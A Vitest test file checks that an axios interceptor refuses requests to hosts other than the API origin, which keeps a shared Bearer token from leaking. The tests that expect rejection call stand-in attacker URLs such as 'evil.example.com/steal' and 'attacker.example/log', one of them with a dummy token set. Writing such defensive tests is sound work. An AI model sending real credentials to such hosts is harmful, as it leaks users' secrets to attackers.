/**
 * Tests for the same-origin guard on the axios request interceptor. The
 * guard refuses to send requests to any origin other than the configured
 * API origin; this prevents the shared `api.defaults.headers.common['Authorization']`
 * Bearer token from leaking to third-party hosts if app code ever passes
 * an absolute URL (either by mistake or via XSS-controlled input).
 *
 * Verifies that relative URLs still resolve against the baseURL and that
 * absolute API-origin URLs pass through unchanged.
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { api } from './config'

// The Vitest test setup assigns a default page origin (http://localhost:3000).
// The test-time __API_BASE_URL__ define is empty (dev-proxy mode), so the
// guard's expected origin is the current window origin.

describe('config — same-origin request guard', () => {
  beforeEach(() => {
    // Clear any previously-set default auth header.
    delete api.defaults.headers.common['Authorization']
  })

  it('rejects requests to an absolute non-origin URL before sending', async () => {
    // No mock adapter is installed; if the guard lets the request through,
    // axios will hang or throw a network error. The guard rejects with
    // the documented prefix before axios attempts the network call.
    const promise = api.get('https://evil.example.com/steal')
    await expect(promise).rejects.toThrow(/Refused to send request to non-API origin/)
  })

  it('rejects protocol-relative URLs to other origins', async () => {
    const promise = api.get('//evil.example.com/x')
    await expect(promise).rejects.toThrow(/Refused to send request to non-API origin/)
  })

  it('does not reject relative URLs (they resolve against baseURL)', async () => {
    // A relative URL is allowed by the guard; axios then fails the
    // request with a network error because no server is listening. The
    // key assertion is that the failure is NOT the guard's message.
    try {
      await api.get('/some-endpoint')
    } catch (e) {
      const message = e instanceof Error ? e.message : String(e)
      expect(message).not.toMatch(/Refused to send request to non-API origin/)
    }
  })

  it('does not reject absolute URLs that point at the current origin', async () => {
    const sameOriginUrl = `${window.location.origin}/api/v1/ok`
    try {
      await api.get(sameOriginUrl)
    } catch (e) {
      const message = e instanceof Error ? e.message : String(e)
      expect(message).not.toMatch(/Refused to send request to non-API origin/)
    }
  })

  it('rejects a request even when an Authorization header is already set (belt and suspenders)', async () => {
    // The whole point of the guard is to prevent default headers from
    // being attached to off-origin calls. Verify the guard still fires
    // when those headers exist.
    api.defaults.headers.common['Authorization'] = 'Bearer would-leak-without-guard'
    const promise = api.get('https://attacker.example/log')
    await expect(promise).rejects.toThrow(/Refused to send request to non-API origin/)
  })
})
